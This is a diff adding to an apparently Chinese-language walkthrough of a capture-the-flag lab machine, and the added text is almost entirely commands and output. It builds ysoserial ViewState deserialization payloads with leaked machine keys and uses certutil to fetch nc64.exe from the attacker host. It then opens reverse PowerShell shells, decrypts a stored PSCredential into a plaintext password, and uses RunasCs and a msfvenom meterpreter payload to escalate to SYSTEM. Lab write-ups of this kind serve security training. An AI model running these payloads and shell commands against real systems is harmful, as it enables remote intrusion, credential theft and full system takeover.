@@ -335,5 +335,171 @@ nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQc
 获取到 Ping 包，制作下一步的反弹 Shell。
 
 ```bash
+(base) PS D:\Github Study\Ysoserial\ysoserial\Release> .\ysoserial.exe -p ViewState -g WindowsIdentity `
+>>   --decryptionalg="AES" `
+>>   --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" `
+>>   --validationalg="SHA1" `
+>>   --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" `
+>>   --path="/portfolio/default.aspx" `
+>>   --apppath="/" `
+>>   -c "certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:\Programdata\nc64.exe"
+Ro8qibCkh5ZWMEa7carikB2ekTCJ5Z9aZ%2FFCYdc5oOD1X2pmTNufL14k9KQ%2FmiVqct1fEAbxQz1uNATCDutk6RyO0oOy4zka5Q%2ByEqzrykFZeKpmYQyPzYaznV5B%2FRn5KOs903N5HH%2FJ8g8322OeKVXulBO%2Bzb5i4rb%2Bqz3BrwiEe4UuLSLO%2BO2jjK0ToCsGNlyL0jR2ZDk8fQFmVecRvQ78dyGpDcf937eDffSR8JrpOxebCHwYkhKv%2FHl8s%2BNlOBuvVlIYs83G9uD%2BsoCXv49eArczNc88noPUGiAB05JeWOxm9FkI8GTSVX6CS8xT6FzU%2Ff4kWpT5uDLGxm9ccCoa4Di9hoSufmgE6%2Bq%2FQidL0FQbi5co44yevrjq3i2%2BOmeRjc8PszPYmmAnpH6XsDzwJzk2GeZRxD5hfjjfpBP8NAOiY25AiLFbzYb1YbVahhoG3izgHrq%2F05inxqa82d8g%2Fqbz0xk48nxL5aev3zJEYX1nvbbI0iXqyl3pJH4I9wMkti2QGTZDRZyauMT0sD4pONtG5vAo5bINovMl%2BIhP6D%2Fc2j5HKboovjuGxifDvsddIAefWA5BU3UzudoTBH%2BEYp3IXdS5E0q1xhuq9N7%2FjNPGuukkQJrNQyO2X3pvVk7m%2FRrpSIdMEDfu8boAcZWpNL%2BRorqyRy7EaMD88DWOYP%2F8ziUv4MMa%2F82i8063OHPf%2FYa31WTWna8eACGE4qz9eGIfPCe4wZ2%2BCVgpGugNTzTjuBqWU4UoEplN%2FmWAscFE7UjICX5KavsKeJ96JHc5tHoDlteTRgl7XC2TlwnR%2F1AY0dv3BmswyDgBXNA5I%2FE46qchQkSP1r2sNs5lyK0OTVi0U%2F7r2MpNYnqkmnP5aJ6OGrBAnZu2VcMJNr3UI4EOPKySreYHOFoI74kcZCe5VcFsALEgozqHWZt%2FRNG0e7zQ0Nkoow26f%2Fltm%2FflykidCCwavgcvxRd5bQAt2sHs1vQTww3W1s%2Fbxx1TbqvYNNC5%2Fl36rEe04GxIu8hB2Q06p4FJSuUiP1ZAo%2F26i11kVAWNUCDlsBZ5UTOq6rx%2F3nZGja7dHU7H2x0DTyH8eYnXGtAJgq1NvK54NZEIs8EZNe6YWvtSCqg42OvVn9GtgvqU5C3rpgNPqFXzhRI3UswPvcCHSdX4ABbL7HAdqNeK39gv1h1kmWuxWhZ4khGC%2FSAR5O7O1Zy5oeY2ChqlKSVOr4ZxG6wYlk%2BufA%2BesXmt7VLvLR0HqnBcZvx7rcwaMZJrTAS1zT0eKiKQSkp79r77GFCVWuheZWzHhHQ%2FivgWRoP%2B22d81xyS4WwkGY1HWO35vwaMLwxyyQ9tkkDnoAOe4GTvWr6PxppTGXt7qkMoNhhC0yM36lTvb9uF0bjBeJf%2FdcVbCF69nlIHqb01vd9La3E9YsujZb7SxH7s9q2y%2BwX1lcX3dZIpilRcOHecOtGhklidygiS0kofYOJJRzwBJObInCJjsY7eoQB2iXPdXtTibAV%2B0nA4jxMeFJq8sePg7KwBPPlHgmI1yWMyXujnwJek6HcsvHXQnNntezmZqlcMYvuwbcubZ7wY5X6aCWAAPtQxsfqCg95CqGG0RjdUySFI72rU8OODXOFhpatPulHiC8fi4wyqG6ooR92ShILyRFzdePgVLtFd7OO5K4qgVv3mGKU3EfIpXlQpFz%2FO5CNQotiu6e%2F7YxqHruxpF8oJIAzDuOOHdBzdxPBA%2B9eSIw8RxrzMvfa2k9nLLhwZTt6L%2F%2FlABf8M5LPTdxxPGHHwdj2iR03LubId460COD1%2BrrBqCKp%2B4DxkeK%2BWXYVKCTK9kDGqxExDirPKtg03%2F3SWmru7OGOI2cnBCS8XEGhdFs9NeU2F%2FTWYfOnkDCYQfxp1h8jylHOg8zpZzAXVmh55feGGP0mZeNwuUN17M2yskrgO7cq2297D0yVOcicyyrJsB4gOkOfR9ptoNlJnxlxXXCVTqi8dIbzM22%2Fu%2BmNd4w%3D%3D
+```
+
+```bash
+(base) PS D:\Github Study\Ysoserial\ysoserial\Release> .\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" `
+>> --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" `
+>> --validationalg="SHA1" `
+>> --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" `
+>> --path="/portfolio/default.aspx" `
+>> --apppath="/" `
+>> -c "C:\Programdata\nc64.exe 10.10.16.58 443 -e powershell.exe"
+AVhpIHO%2FQQOb4RbHq4QEfl3zqI7MFDUm74sXD%2Bm%2FNtx1R%2BT3dF7gMkVyjwQMqvFg9p1imKLx1INoUW4Sdtl5teWbWOdUNYJjjPRcL%2BWoubAq2srK69eEzW4swqJUnLZgYxjes7DKAEwk9GNqNL8mTTCHViaM21UkH%2Bg0y3jj1fEqjo13RE2mXBHuu74yxgxY9gHAWGULdMp8qvNyin%2BMi%2BXX8PD%2BBylIoiYaxzYT8ExoezsQcQ9dHnirzaxgnJ%2BMx0kpPnZ2KkNgdDbrSQsxwGttCJAUG8g9XnqaFX%2B6D%2BfqCCyEfzn0bLlhH34NaTZC7ApUbcb5xUApkhCncnVc76MP9Sj9h6c5A3NI5zPhoFHizfuJ7bXJ15ooZdHKUY9GwvHnOe%2BJFEVRrnJb1Y7IBp%2FYxCqrbXN4bvxRsE57tTfAzR4kYyErpKNogMGDq0Xoik%2FXZ9Loo00OT507yX7JiHwa3JB8WnNShkVsgAroxY3lyh0OcMaGmdYaCFc90owujvVf6%2F9Le23T8zNYWgvRmsJ4WGBrTdjLiVCCdKs6rZ84WwC2VZ1mw2PWP5m2omz1F5PmnN2IvSb9O3EE%2BkVjHne0bWu0SVLNTQr3loVVvsEpGmlPYZgqK7KVio4e9VSO0R2BOKvcn8ly5AfP7SK2so9qzX9iCuRlqs%2F8QNI4kLPWVEjpgi6ZAV5FyOiMF5eMm4Ah7dpQ0KFjtrIQ%2BD%2FHdEDpN0%2B0DHKEAJ91yV0%2Bck6p0S1lSnkfFhSOkVmdDle109tz%2FyVpoqIq%2BeeIz4hN%2BpOyYsM2%2FE3cCyH5WXbS8eeEQzwMEEqCt61%2Bz1xwM3bvo6G1CQ96tYs3FI%2BezEnEBO0Y%2BAxyF7IOft%2BcLn0sQkdDQlxENCeAGeMT6t3XjbxVGzMX4Zjf2Rpk6eFd93anzuLXsiDVJf1Ju4bWgZuBRSvByizrT%2B0aqzbRIexNGyIp%2BhJp7k4LHx6WFka5rxDWLNfgAHAalKPyqu%2B3%2F3wBoO5xrRTDo6z3YmshLjbc7hVI5WgkofO86yCJwlwbR9AO9IWM2jmZF%2BECqXNJr5DQRqA6tNVJEgHqXChcyR7SJb75pZV0IkeUVn1KKiyHyYx0KwosKSQim%2By2Ol6UIrLM3Ne38SkaT9rUAhBrw60OYG0RLUphgGnRtSl5FCZ3Q4SODK%2F87eSQ4FfMjM6GguA2GCFCDl4rHJRL2v6T02g7KcQlQnWYBGKRT1a%2BD2HhESNk7bQJhvoLk%2BsunBV3xkNH7Lx0QgyIUF%2BDoXtP0L1C8aCR29c1So1CYvp7mC3aLGixYR2VzgTdJmY5u8QfjYHbHwQfk2R8NIg8FmmAyWImcvPZY8crZoMgA2UmmLzXYuuKLmS3p2s3QcAZvycoPkdWam8US8dyE1NHENkmVTRd5IfpfGbnUKdx3q7Z1SpUKenu32XZg6DPXt5ikN2r1%2BJcNz40pOq%2FuMjGqW%2Bm7IKqQdYTvI2chjWWKiVw9Xt8968Qu0annl0cwKBDe0ai%2B0o8v5KMRzoJ7UtyeWlDNVXBjg%2B96r78AAF5atuCx%2BRMZAg8IiDeZPmxLjj3EOldEvQGrbD13Zok8dKKC5k42OO3to47TH3t0sUsajVbCJ0zsVm8kdw%2FuX%2F5nO1F2%2FIfnX0IwjYp%2F4Ummb2t%2Bk4xlJm1KcNdk7YzHyofiY2uBPIsocseVJU2JpUqjcODsHvhV8wAISiZC7f1twT0ZM4R1wseyNO3tw0vfdUMkiG8pxbl6kOtSCa6wkMwxsTEjqu%2BgI4qz1oY9a94VOkwDDKUyilA%2FBagwA8fuPuBdsXIeizk8AZz5MmN9ihydKA75ZrtOgFMk1juFkguR7KaAakIBxJf7FJnvBmid5Gv%2FCGaZgJXp0gE36T9mBjiijOe6VSvmRE0eHIoHu6WkVTqCgG43%2FRk00Gl3%2FeXkA%3D%3D
+```
+
+得到初始立足点。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo rlwrap -cAr nc -lvnp 443
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.10.16.58] from (UNKNOWN) [10.129.230.183] 49673
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv> whoami
+whoami
+pov\sfitz
+```
+
+## Windows 提权
+
+在 `sfitz` 的 `Document` 中发现文件 `connection.xml`。
+
+```bash
+PS C:\Users\sfitz\Documents> cat connection.xml
+cat connection.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+读取密码。
+
+```bash
+PS C:\Users\sfitz\Documents> $cred = import-clixml -Path connection.xml
+$cred = import-clixml -Path connection.xml
+PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().UserName
+$cred.GetNetworkCredential().UserName
+alaading
+PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
+$cred.GetNetworkCredential().Password
+f8gQ8fynP44ek1m3
+```
+
+将 RunasCs.exe 导入靶机。
+
+```bash
+PS C:\Programdata\apps> certutil -urlcache -f http://10.10.16.58/RunasCs.exe RunasCs.exe
+certutil -urlcache -f http://10.10.16.58/RunasCs.exe RunasCs.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Programdata\apps> dir
+dir
+
+
+    Directory: C:\Programdata\apps
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        3/13/2026   6:52 AM          51712 RunasCs.exe
+```
+
+使用 RunasCs 获取 alaading 的环境。
+
+```bash
+PS C:\Programdata\apps> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.58:408
+.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.58:408
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-71fe9$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4392 created in background.
+```
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo rlwrap -cAr nc -lvnp 408              
+[sudo] password for kali: 
+listening on [any] 408 ...
+connect to [10.10.16.58] from (UNKNOWN) [10.129.230.183] 49679
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+pov\alaading
+```
+
+枚举权限。
+
+```bash
+PS C:\Users\alaading\Desktop> whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Enabled 
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.58 LPORT=4444 -f exe -o met.exe
+# 复制到 goshs 服务目录
+cp met.exe ~/Work/Kali/
+```
+
+```bash
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.16.58
+set LPORT 4444
+run
+
+```
+
+```bash
+(New-Object Net.WebClient).DownloadFile('http://10.10.16.58/met.exe', 'C:\Programdata\met.exe')
+C:\Programdata\met.exe
+
+```
+
+```bash
+meterpreter > ps              # 查看进程列表，找 winlogon.exe 的 PID
+meterpreter > migrate <PID>   # 例如 migrate 612
+meterpreter > getuid          # 确认变成 NT AUTHORITY\SYSTEM
+
+```
+
+
+```bash
+meterpreter > shell
+C:\> type C:\Users\Administrator\Desktop\root.txt
 
 ```
